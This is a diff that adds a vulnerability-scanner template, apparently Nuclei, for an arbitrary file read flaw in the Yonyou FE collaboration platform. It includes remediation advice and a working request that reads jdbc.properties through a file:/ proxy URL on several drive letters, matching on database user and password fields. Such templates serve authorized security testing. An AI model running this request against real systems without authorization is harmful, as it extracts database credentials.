@@ -1,0 +1,47 @@
+id: wooyun-2010-082455
+info:
+  name: Yonyou FE FILE Protocol File Read Vulnerability
+  author:
+  - 折跃
+  description: |-
+    Yonyou FE collaboration office platform arbitrary file read vulnerability
+    The FE business collaboration platform has an arbitrary file read vulnerability. An attacker can exploit it to read arbitrary files.
+  severity: medium
+  remediation: |-
+    Official fix:
+    1. It is recommended that users obtain the latest patch or latest version from the official website:
+    https://www.yonyou.com/
+
+    Temporary fix:
+    1. Filter "." so that users cannot traverse to parent directories in the URL.
+    2. Strictly validate the format of user-supplied parameters using regular expressions; hard-code or uniformly encode the file name parameter passed by the user, control file types through a whitelist, and reject parameters containing malicious or empty characters.
+    3. Disable directory traversal services on the system; for example, set open_basedir in php.ini to restrict the file access scope.
+    4. Store file paths in the database and let users submit the file ID to download the file.
+    5. Verify permissions before allowing users to download files.
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code==200
+    - contains(body,'jdbc.user')
+    - contains(body,'jdbc.password')
+  path:
+  - '{{BaseURL}}/ProxyServletUtil?url=file:/{{dish}}:/FE/jboss/server/default/deploy/fe.war/WEB-INF/classes/jdbc.properties'
+  attack: batteringram
+  method: GET
+  payloads:
+    dish:
+    - C
+    - D
+    - E
+    - F
+    - G
+    - H
+    - "Y"
+  headers:
+    Host: '{{Hostname}}'
+  req-condition: true
+  stop-at-first-match: true
+variables:
+  verify: '{{rand_text_alphanumeric(32,"")}}'
